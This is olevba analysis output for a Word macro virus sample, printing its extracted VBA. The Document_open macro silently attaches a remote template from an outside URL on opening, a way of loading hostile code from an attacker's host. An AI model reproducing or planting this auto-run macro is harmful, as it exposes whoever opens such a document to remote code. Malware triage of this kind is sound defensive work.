olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.ATU-5674c895dc8a1c99a3a3313a2ab9ce9b4c2d245e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.ATU-5674c895dc8a1c99a3a3313a2ab9ce9b4c2d245e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
Private Sub Document_open()
On Error Resume Next
ActiveDocument.AttachedTemplate = "http://www.sourceofkaos.com/homes/1nternal/update.dot"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.sourceofk|URL                                          |
|          |aos.com/homes/1ntern|                                             |
|          |al/update.dot       |                                             |
+----------+--------------------+---------------------------------------------+

